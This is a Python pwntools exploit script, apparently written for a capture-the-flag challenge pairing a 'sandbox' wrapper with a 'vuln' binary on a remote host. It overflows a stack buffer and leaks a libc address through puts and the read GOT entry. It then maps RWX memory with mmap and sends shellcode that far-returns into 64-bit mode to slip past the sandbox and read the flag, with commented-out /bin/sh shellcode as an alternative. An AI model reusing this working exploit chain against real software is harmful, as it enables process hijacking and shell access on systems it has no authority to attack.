#coding:utf-8
from pwn import *

# local process envirnoment
LOCAL = True

#retmote args
remote_host = "118.31.18.145"
remote_port = 20004

elf_sanbox = ELF("sandbox")
elf_vuln = ELF("./vuln")

context.clear(arch='i386')

argv = ["./sandbox", "./vuln"]

if LOCAL:
    context.log_level = "debug"
    #mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "./libc.so.6:/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    #mine_env['LD_PRELOAD'] = "./libc.so.6"
    mine_env = {'LD_PRELOAD': './libc.so.6'}
    io = process(argv, env=mine_env)
    #io = process("./vuln", env=mine_env)
    libc = ELF("./libc.so.6")
else:
    libc = ELF("./libc.so.6")
    io = remote(remote_host, remote_port)

def s_exp():
    bss_tdatddr = 0x804A064
    main_addr = 0x804865B
    vuln_func = 0x80485CB

    payload='a'*0x30+chr(0x48)
    payload+=p32(elf_vuln.plt["puts"]) + p32(vuln_func)
    payload+=p32(elf_vuln.got["read"])
    io.sendline(payload)
    io.recvline()
    data = io.recv(4)
    read_addr = u32(data)
    libc.address = read_addr-libc.symbols["read"]
    system_addr = libc.symbols["system"]
    mmap_addr = libc.symbols["mmap"]

    log.info("libc addr:"+hex(libc.address))
    log.info("mmap:"+hex(mmap_addr))
    log.info("system addr:"+hex(system_addr))

    mped_addr = 0x23330000

    payload='a'*0x30+chr(0x48)
    payload += p32(mmap_addr) + p32(vuln_func)
    payload += p32(mped_addr) + p32(0x1000) + p32(7) + p32(0x22) + p32(0) + p32(0)
    io.sendline(payload)

    #shellprod = pwnlib.shellcraft.i386.linux.cat("./flag")
    print pwnlib.shellcraft.i386.linux.cat("./flag").strip()
    print pwnlib.shellcraft.i386.linux.sh().strip()
    shellcode = "\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb"
    #shellcode += asm(pwnlib.shellcraft.i386.linux.cat("./flag"))
    context.arch='amd64'
    context.bits=64
    #shellcode += "h\x01\x01\x01\x01\x814$`f\x01\x01h./fl\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80"
    code = asm(shellcraft.amd64.linux.cat('./flag'))
    shellcode += code
    #shellcode += '\x4d\x31\xc0\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\xbf\x00\x00\x80\x00\xb8\x38\x00\x00\x00\x0f\x05\x85\xc0\x75\xfe\x48\x31\xd2\x48\x31\xf6\x48\x8d\x3d\x09\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05\x90\xcc\x2f\x62\x69\x6e\x2f\x73\x68'

    payload='a'*0x30+chr(0x48)
    payload += p32(elf_vuln.plt["read"]) + p32(mped_addr)
    payload += p32(0) + p32(mped_addr) + p32(len(shellcode))
    io.sendline(payload)

    io.send(shellcode)

    #io.recvall()
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
